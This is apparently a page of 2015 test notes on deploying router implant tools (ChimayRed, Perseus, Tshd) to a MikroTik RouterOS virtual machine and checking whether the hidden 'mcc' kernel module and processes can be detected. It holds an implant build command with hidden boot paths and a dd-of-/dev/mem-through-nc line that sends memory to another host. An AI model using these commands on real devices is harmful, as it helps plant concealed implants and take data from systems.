@@ -1,0 +1,248 @@
+
+                        Owner: User #14587667
+DUT5 - x86 VM - Notes
+IP: 172.20.100.26/30
+VLAN: 617
+ROS: 6.19
+Tool Versions Used:
+ChimayRed 4.6.1
+TshPatcher 1.0.4
+Perseus 1.1.0
+ 
+Test Notes
+7/27/2015
+
+Create Ubuntu 14.10 Host VM
+Imported ROS 6.19 x86 VMVirtual Machine into vSphere.
+
+7/28/2015
+
+Generate Perseus binary: python bin/perseus_1.1.0.4_routeros6_i386.zip -f /flash/boot/hidden -f /flash/etc/rc.d/run.d/S99mcc -f /flash/etc/rc.d/run.d/S99tsh -d /flash/boot/hidden -p /flash/rw/tmp/tshd-mipsbe -S /flash/boot/hidden/startup -s 2 -m /flash/boot/hidden/mcc.ko -r /flash/boot/hidden/dont_panic -z /flash/boot/hidden/zero deploy_$PERSEUS_DEPLOY_VERPERSEUS_DEPLOY_VER=2015-07-28
+
+Configured WAN, LAN, DHCPDynamic Host Configuration Protocol Server, NATNetwork Address Translation on DUT.
+Threw ChimayRed and Tshd.  Uploaded BB.
+
+7/29/2015
+
+Re-ran all tests listed below.  Completed testing - no new finding/observations.
+Started putting together ERB package.
+
+Operator Notes
+
+No default firewall to block port 80 (Web GUIGraphical User Interface) on ROS 6.19 x86.
+No attempts to connect to cloud.mikrotik.com are seen.
+
+ 
+Tests to Run:
+mcc is visible
+
+
+ID
+Status
+Task
+
+
+1
+complete
+lsmod | grep mcc   # mcc will appear in list
+
+
+2
+complete
+ls /lib/modules/3.3.5     #no mcc
+
+
+3
+complete
+ls /ram/pckg                 #no mcc
+
+
+Inconsistent hiding
+
+
+ID
+Status
+Task
+
+
+4
+complete
+ls /sys/module       #mcc should be visible
+
+
+5
+complete
+ls /sys/kernel        # mcc should be hidden
+
+
+Check netstat for PID/Program name
+
+
+ID
+Status
+Task
+
+
+15
+complete
+bb netstat -p
+
+
+Check if kallsyms shows 'mcc' and its symbols
+
+
+ID
+Status
+Task
+
+
+16
+complete
+cat /proc/kallsyms | bb grep mcc
+
+
+Flux appears in firewall connections
+
+
+ID
+Status
+Task
+
+
+6
+complete
+
+/ip firewall connection print
+
+
+
+Sequential listing of /proc/pid reveals hidden directories. 
+
+
+ID
+Status
+Task
+
+
+7
+complete
+Run following script
+
+
+cd /flash/boot
+vi iterate_proc.sh
+#!/bin/ash  i=1  #echo "PIDs in /proc/" > proc_dirs  while [ $i -lt 1000 ];  do          test -d /proc/$i && echo $i >> proc_dirs          i=$((i+1));  done  
+chmod +x iterate_proc.sh bb ls -1v /proc > ls_dirs  bb grep -Fxv -f ls_dirs proc_dirs 
+Check if connection is attempted to cloud.mikrotik.com
+
+
+ID
+Status
+Task
+
+
+8
+complete
+/system logging add action=echo topics=system,!ntp,!dhcp,!rip,!snmp
+
+
+Connection is NOT attempted on 6.19 x86.
+Inspect Memory
+
+
+ID
+Status
+Task
+
+
+9
+complete
+ICON: nc -l -p 9999 | dd bs=1048576 of=DUTX-ram.bin
+
+
+10
+complete
+Target: /flash/boot/hidden/busybox dd if=/dev/mem bs=1048576 count=512 | bb nc 172.20.12.100 9999
+
+
+11
+complete
+Check for ELFs
+
+
+12
+complete
+Check if call tables were modified
+
+
+13
+complete
+Check mcc.ko for 'srcversion' string
+
+
+14
+complete
+Remove perseus and re-inspect memory for mcc unload.  Search for 'unload'
+
+
+Verify Files Hidden
+
+
+ID
+Status
+Task
+
+
+0
+complete
+bb ps ax | grep startup
+
+
+17
+complete
+bb ps ax | grep tsh
+
+
+18
+complete
+bb ps ax | grep flx
+
+
+ 
+ 
+
+Previous versions:
+| 1 empty
+| 2 empty
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+| 9 
+| 10 
+| 11 
+| 12 
+| 13 
+| 14 
+| 15 
+| 16 
+| 17 
+| 18 
+| 19 
+| 20 
+| 21 
+| 22 
+| 23 
+| 24 
+| 25 
+| 26 
+| 27 
+| 28 
+| 29 
+| 30 
+| 31 
+| 32 
+|
+                    
